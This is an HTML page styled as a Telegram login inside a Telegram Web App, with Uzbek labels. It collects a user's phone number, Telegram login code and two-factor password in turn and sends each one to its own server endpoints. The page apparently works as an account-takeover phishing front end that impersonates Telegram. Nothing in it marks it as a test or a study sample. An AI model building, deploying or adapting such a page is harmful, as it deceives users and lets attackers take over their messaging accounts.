<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<title>Telegram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
/* SIZ BERGAN DIZAYN 100% SAQLANDI */
:root {
    --tg-bg:#0f172a;--tg-card:#111827;--tg-primary:#2ea6ff;
    --tg-text:#e5e7eb;--tg-muted:#9ca3af
}
body{margin:0;background:var(--tg-bg);font-family:sans-serif;color:var(--tg-text)}
.container{min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:100%;max-width:420px;background:var(--tg-card);
border-radius:18px;padding:24px}
.step{display:none}.step.active{display:block}
input,button{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
input{background:#020617;color:white}
button{background:var(--tg-primary);color:white;font-weight:600}
</style>
</head>

<body>
<div class="container">
<div class="card">

<h2 style="text-align:center">üîê Telegram Login</h2>

<div id="stepPhone" class="step active">
    <input id="phone" placeholder="+998********">
    <button onclick="sendCode()">üì© Kod yuborish</button>
</div>

<div id="stepCode" class="step">
    <input id="code" placeholder="Telegram kodi">
    <button onclick="verifyCode()">‚úÖ Tasdiqlash</button>
</div>

<div id="stepPassword" class="step">
    <input id="password" type="password" placeholder="2FA Parol">
    <button onclick="verifyPassword()">üîì Kirish</button>
</div>

</div>
</div>

<script>
const tg = Telegram.WebApp;
tg.ready(); tg.expand();

let phoneValue = "";

function show(id){
    document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
    document.getElementById(id).classList.add("active");
}

async function sendCode(){
    phoneValue = phone.value.trim();
    if(!phoneValue) return alert("Telefon kiriting");

    const res = await fetch("/send_code",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone:phoneValue})
    });

    const data = await res.json();
    if(data.status==="code_sent") show("stepCode");
    else alert(JSON.stringify(data));
}

async function verifyCode(){
    const codeVal = code.value.trim();
    if(!codeVal) return alert("Kod kiriting");

    const res = await fetch("/verify_code",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone:phoneValue,code:codeVal})
    });

    const data = await res.json();
    if(data.status==="success"){
        alert("Login OK");
        tg.close();
    } else if(data.status==="2fa_required"){
        show("stepPassword");
    } else alert(JSON.stringify(data));
}

async function verifyPassword(){
    const pass = password.value.trim();
    const res = await fetch("/verify_password",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({phone:phoneValue,password:pass})
    });

    const data = await res.json();
    if(data.status==="success"){ alert("Login OK"); tg.close(); }
    else alert(JSON.stringify(data));
}
</script>
</body>
</html>
